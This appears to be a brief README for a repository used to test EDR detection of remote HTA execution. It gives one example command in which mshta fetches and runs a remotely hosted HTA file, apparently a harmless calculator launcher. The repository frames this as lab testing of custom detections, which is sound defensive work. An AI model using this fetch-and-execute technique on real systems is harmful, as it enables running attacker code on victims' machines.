# HTA_calc
Testing malicious remote HTA script execution.

Threat Actors can run HTA scripts on windows devices that are remotely hosted by use of mshta.

Example Command:
```
mshta https://raw.githubusercontent.com/MalwareLab49/HTA_calc/main/HTA_calc.hta
```

The intent of this content is to allow for testing in a lab enviornment with EDR deployed to confirm that custiom detections are working as intended.
